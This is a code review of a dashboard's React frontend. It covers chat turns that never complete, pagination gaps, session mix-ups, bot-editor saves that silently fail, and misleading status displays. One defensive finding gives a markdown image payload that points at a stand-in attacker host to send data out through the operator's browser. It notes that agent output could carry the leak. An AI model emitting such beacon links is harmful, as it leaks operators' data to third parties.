# web-frontend review

Scope: `web/src/`. Only `main.tsx`, `App.tsx`, `api.ts` and the files they import are built (`web/tsconfig.app.json` include list). Most of the rest of `web/src/` (the other pages, `components/`, `i18n/`, `plugins/`) is not imported and is dead code. I traced every finding against the server contract in `src/dashboard.rs`. I did not build or run the dashboard.

### [P1] Chat turn never completes on error, direct-reply or silent turns; Send stays disabled and the socket leaks
- Location: web/src/App.tsx:586
- Trigger: In the Playground, send a message whose turn ends without an `OutboundAction::Stream{is_final:true}`. Three real paths do this:
  - Agent failure: `src/multiplexer/actor.rs:597` dispatches `OutboundAction::SendMessage{content: error}`.
  - Session-status direct reply: `dashboard.rs` `intercept_session_status` goes through `dispatch_direct_reply`, which sends `SendMessage`. A web message of "session status" triggers it.
  - Explicit-silence turn, or a user Stop.
  - These reach the browser as `{"type":"event","event":{"type":"send_message",...}}`. `OutboundAction` is serialized with `tag="type", rename_all="snake_case"`. The `onmessage` handler only recognises `stream` with `chunk.is_final`, `ev.is_final`/`final`, and top-level `error`. `send_message` is ignored.
- Impact:
  - `isSending` stays true. The input and Send button are disabled and the placeholder reads "Agent is thinking & executing tools..." indefinitely.
  - The error text or direct reply is never shown or reloaded.
  - There is no `ws.onclose` handler and no unmount cleanup, so that WebSocket and its `loadMessages`/`setState` callbacks live until the server drops it.
  - Stop is the only way out, and `handleStopTurn` (App.tsx:622) opens yet another socket.
- Fix:
  - Treat `send_message` events as terminal: reload messages and clear `isSending`.
  - Add `ws.onclose` that clears `isSending` and `streamingContent`.
  - Close the socket in a `useEffect` cleanup, keeping it in a ref.

### [P1] Chat transcript only loads the first 50 messages, so replies in long sessions never appear
- Location: web/src/App.tsx:513
- Trigger: Open or continue any session with more than 50 messages. `loadMessages` calls `api.sessionMessages(id)` (api.ts:156) with no `page` or `per_page`. `list_messages` (`src/dashboard.rs` around line 1135) defaults `per_page` to 50 and uses `ORDER BY sequence ASC LIMIT ? OFFSET ?`. Callers: initial load, Reload (App.tsx:711), and every final event (App.tsx:571/580/588).
- Impact:
  - The UI shows only the oldest 50 messages.
  - The new user message and the agent's reply are never displayed, because they sit at sequence greater than 50. The optimistic user message vanishes on reload and the final reply is invisible.
  - This also happens for Discord sessions opened from the Sessions page.
  - The `total` and `page` fields in the response are ignored.
- Fix: Request the last page (`page = ceil(total/per_page)`) or loop pages until `items.length >= total`, with `per_page=200`. Alternatively add a newest-first or tail parameter on the server.

### [P1] Switching conversations during a running turn shows the wrong session's messages and streaming text
- Location: web/src/App.tsx:571
- Trigger: Send a message in session A, then click session B or "+" before the turn finishes. Agent turns take seconds to minutes, so this is routine. The `ws.onmessage` closure keeps `currentSessionId` = A. On the final event it calls `loadMessages(A)`, which overwrites `messages` with A's transcript while the header and send target are B. `setStreamingContent` and `setIsSending` likewise apply to B's view. The `loadMessages` effect (App.tsx:526) also has no cancellation, so responses for rapidly switched sessions can land out of order.
- Impact: The operator sees session A's transcript under session B's header and can type the next message believing it continues A. Streaming text from A is rendered in B. `isSending` is global, so B's input is disabled.
- Fix: Keep a ref of the active session id and ignore or skip socket events and `loadMessages` results when it differs from the session that issued them. Use an `AbortController` or request counter in `loadMessages`. Close the in-flight socket on session switch.

### [P1] Clearing Model / Persona / Toolsets in the bot editor reports success but changes nothing
- Location: web/src/pages/BotsPage.tsx:121
- Trigger: Click Configure on a bot that has a model override, empty "Model Override" (or the persona or toolsets field), and Save. The UI sends `model: null`, `system_prompt: null`, `enabled_toolsets: null`. `update_bot` (`src/dashboard.rs` ~1986-1991) deserializes null as `Option::None` and applies `.or(existing.*)`, so the stored value is kept. The dialog closes and `loadBots()` re-renders the old values.
- Impact: Operators cannot remove a model override, persona or toolset restriction through the UI, and nothing tells them it failed. The bot keeps running with the old model or restrictions. The placeholder text, "Leave empty for gateway default model", promises the opposite.
- Fix: Make the server distinguish "absent" from "null" (for example `Option<Option<T>>` with `deserialize_with`) so explicit null clears. Alternatively send an empty string and have the server normalize `""` to NULL. Fixing the frontend alone cannot work with the current server.

### [P2] "Add Agent Profile" silently overwrites an existing bot profile
- Location: web/src/pages/BotsPage.tsx:75
- Trigger: Enter a Bot ID that already exists and submit. The only guard is non-empty fields. `create_bot` (`src/dashboard.rs` ~1915) is an `INSERT ... ON CONFLICT(bot_id) DO UPDATE`.
- Impact: The existing profile's model, prompt and toolsets are replaced by the form values. `custom_settings_json` resets to `{}`, which loses `avatar_url`. The UI reports success and the previous config is gone.
- Fix: Reject in `handleCreate` when `bots.some(b => b.bot_id === newBotId.trim())`. Ideally also make the server insert fail on conflict.

### [P2] WebSocket-error fallback can duplicate the user turn, and its reply is never shown
- Location: web/src/App.tsx:604
- Trigger: The socket opens, `onopen` sends the message, then the connection errors (network blip or server restart). `ws.onerror` re-sends the same text over HTTP via `api.postChat`, so the agent can receive the prompt twice. `postChat` returns 202 `{queued:true}` (`post_chat` in `dashboard.rs`), not a response. The code waits a fixed 1.5s, calls `loadMessages`, and clears `isSending`. The agent has usually not replied by then, and no listener remains for the real reply.
- Impact: Duplicate agent turns (including tool executions) on flaky connections. If the socket failed before open, the reply appears only after a manual Reload.
- Fix: Fall back to HTTP only if `onopen` never fired. After the HTTP post, poll or re-subscribe for the reply instead of using a fixed timeout.

### [P2] Chat transcript is wiped on any transient load error
- Location: web/src/App.tsx:516
- Trigger: A transient 5xx, network error or timeout on `GET /api/sessions/{id}/messages`, for example the reload after a final event or the Reload button. The `catch` does `setMessages([])`.
- Impact: The conversation view is replaced with "Session initialized and ready", as if history were lost, until the next successful load. A network error is indistinguishable from a brand-new session. A 404 for an unsaved web session is the only case where an empty list is correct.
- Fix: Clear messages only for 404, and keep the existing messages and surface an error otherwise.

### [P2] Newly created conversations disappear from the sidebar and become unreachable
- Location: web/src/App.tsx:521
- Trigger: Click "+" to create `web-<id>`, chat, then click another conversation or Default Playground. `loadSessions()` runs only once on mount, so the new session is never added to `sessions` even though the server persists it.
- Impact: The operator cannot return to that conversation from the UI without leaving and re-entering the Playground.
- Fix: Call `loadSessions()` after each turn completes, and add the current id to the list optimistically.

### [P2] Security page misreports pending approvals as empty and does not refresh
- Location: web/src/App.tsx:1300
- Trigger: Two paths:
  - The page loads approvals, allowlist and config in a single `Promise.all` inside `try { } catch {}`. If any one request fails (for example `/api/config`), nothing is set, and the UI renders "No pending execution approvals. All systems operating safely."
  - The list loads only on mount. The header badge, driven by the 4s status poll, still shows "N Pending Approvals", and clicking it while already on the settings page does nothing.
- Impact: An operator on the page sees an approval count with an empty list and a reassuring message. The agent turn stays blocked until the approval expires.
- Fix: Load each endpoint independently and show errors. Poll while the page is open, or reload when `status.pending_approvals` changes.

### [P2] Approval card shows an empty session identifier
- Location: web/src/App.tsx:1357
- Trigger: Any pending approval. `PendingApprovalView` (`src/dashboard.rs` ~416) serializes `session: SessionKey` and has no `session_id`. The card renders `{a.session_id}`, which is undefined, so the title is blank.
- Impact: The operator approves a dangerous command with no indication of which session or channel requested it.
- Fix: Render the `session` fields (platform, channel_id, thread_id, user_id), or add a `session_id` to the server view.

### [P2] Overview page shows a blank model and a false 100% disk usage
- Location: web/src/App.tsx:305
- Trigger: Two paths:
  - Any status load: `api_status` returns no `model` field, so `{status.model}` at line 319 renders empty.
  - When disk sampling fails (`workspace_total_bytes` null, `pressure: "unknown"`), the code uses `|| 1` and `|| 0`. That yields `diskUsedPercent = 100`, and the bar turns red and reports "1 B / 1 B (100%)".
- Impact: The Active Model card is always empty. A failed disk probe is shown as a full disk.
- Fix: Return `model` from `/api/status` (or hide the card when absent). Render "unknown" when the disk totals are null.

### [P2] Running cron runs are labelled as failures with "Completed cleanly"
- Location: web/src/App.tsx:1082
- Trigger: Click "Run Now" or let a job run, then view history. `r.status === 'succeeded' ? 'success' : 'destructive'` renders `running` (and `abandoned`) in the red failure style. The Outcome column prints "Completed cleanly" whenever `error` is null, which is always true for a running run. The status values come from `src/cron/scheduler.rs` (`'running'`, `'succeeded'`, `'failed'`).
- Impact: An in-flight run looks failed and "completed cleanly" at once. This misleads operators triaging cron health.
- Fix: Map `running` to a neutral badge and show "In progress". Show "Completed cleanly" only for `succeeded`.

### [P2] Live Logs duplicates the tail and produces duplicate React keys
- Location: web/src/App.tsx:1432
- Trigger: Open the Live Logs page. `api.logs()` returns the last 250 entries and replaces state when it resolves. `handleLogsSocket` (`src/dashboard.rs` ~2195) also replays the last 100 entries over the WebSocket. Entries that arrive on the socket before the HTTP response are dropped by the replace, and the overlap is duplicated otherwise. Rows use `key={log.id ?? idx}` (App.tsx:1491), so duplicated ids collide. Synthetic warning rows use `id: Date.now()`, which can also collide.
- Impact: Duplicated log lines on every page open. Duplicate keys make React reuse or misplace rows on later updates. There is also no reconnect, so after a server restart the page stays "Disconnected".
- Fix: Merge by id (dedupe) and append instead of replacing. Use a monotonic key. Add a reconnect with backoff.

### [P2] Session search has no request cancellation, so stale results can overwrite fresh ones
- Location: web/src/App.tsx:1150
- Trigger: Type quickly in the Session Explorer search box. Every keystroke changes `search` and fires `api.sessions(search)`. Responses are applied in arrival order, so a slow earlier query can overwrite the latest results.
- Impact: The list can show results for a different query than the box contains.
- Fix: Debounce the input and use an `AbortController` or a request counter so only the latest response is applied.

### [P2] Message content can load arbitrary remote images (operator-side beacon and exfiltration channel)
- Location: web/src/App.tsx:805
- Trigger: `ReactMarkdown` renders every message's content, including user messages from Discord sessions opened via "Open in Chat" and tool or agent output. The custom `img` renderer (and the extracted image links at line 837) fetch whatever `src` the content supplies. A message such as `![x](https://attacker.example/p.png?d=<data>)` makes the operator's browser request that URL as soon as the transcript renders.
- Impact: The operator's IP and any data the agent encoded into the URL leak to a third party. It is low-impact, but the dashboard is an owner-only admin surface that displays untrusted Discord and agent text.
- Fix: Drop remote `img` rendering, or restrict `src` to same-origin and `data:` URLs. Render other images as plain links.
